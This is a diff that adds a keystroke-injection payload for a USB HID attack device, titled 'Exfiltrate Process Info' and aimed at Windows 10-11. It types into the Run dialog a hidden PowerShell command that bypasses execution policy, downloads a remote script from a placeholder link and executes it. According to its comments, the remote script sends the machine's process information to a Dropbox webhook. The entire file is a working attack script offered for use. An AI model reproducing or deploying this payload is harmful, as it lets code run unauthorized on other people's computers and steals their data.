@@ -1,0 +1,26 @@
+##########################################
+#                                        #
+# Title        : Exfiltrate Process Info #
+# Author       : Aleff                   #
+# Version      : 1.0                     #
+# Category     : Exfiltration            #
+# Target       : Windows 10-11           #
+#                                        #
+##########################################
+
+ATTACKMODE HID
+
+# Requirements:
+#     - Internet Connection
+#     - Dropbox Webhook
+
+# VARIABLES:
+# - Reply example.com with your own link. The Payload should be ExfiltrateProcessInfo.ps1
+PAYLOAD_LINK='example.com'
+
+QUACK DELAY 2000
+QUACK GUI r
+QUACK DELAY 250
+QUACK DELETE
+QUACK STRING powershell -w h -ep bypass irm $PAYLOAD_LINK | iex
+QUACK ENTER
